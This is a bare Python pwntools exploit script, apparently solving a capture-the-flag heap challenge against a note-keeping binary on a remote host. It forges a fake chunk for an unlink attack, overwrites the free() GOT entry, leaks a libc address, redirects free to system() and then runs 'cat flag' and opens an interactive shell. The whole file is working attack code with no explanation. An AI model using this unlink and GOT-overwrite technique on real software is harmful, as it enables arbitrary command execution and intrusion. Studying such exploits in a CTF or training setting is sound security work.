from pwn import*
def menu(ch):
	p.sendlineafter("options >>",str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('length:',str(size))
	p.sendafter('info:',content)
def free(index):
	menu(2)
	p.sendlineafter('user:',str(index))
def edit(index,content):
	menu(3)
	p.sendlineafter("edit:",str(index))
	p.sendafter('info:',content)
def show(index):
	menu(4)
	p.sendlineafter("show:",str(index))
p = process('./run.sh',shell=True)
p = remote('183.129.189.62',58603)
free_got = 0x4117B4
note_list = 0x411830
new(0x80,"FMYY")
new(0x88,"FMYY")
new(0x20,"cat flag\n")
edit(0,p32(0) + p32(0x81) + p32(note_list -12) + p32(note_list -8) + '\x00'*0x70 + p32(0x80) + p32(0x90))
free(1)
edit(0,p64(0) + p32(free_got) + p32(4))
show(0)
p.recvuntil('info: ')
libc_base = u32(p.recv(4)) - 0x56B68
log.info('LIBC:\t' + hex(libc_base))
system = libc_base + 0x5F8F0
edit(0,p32(system))
free(2)
p.interactive()
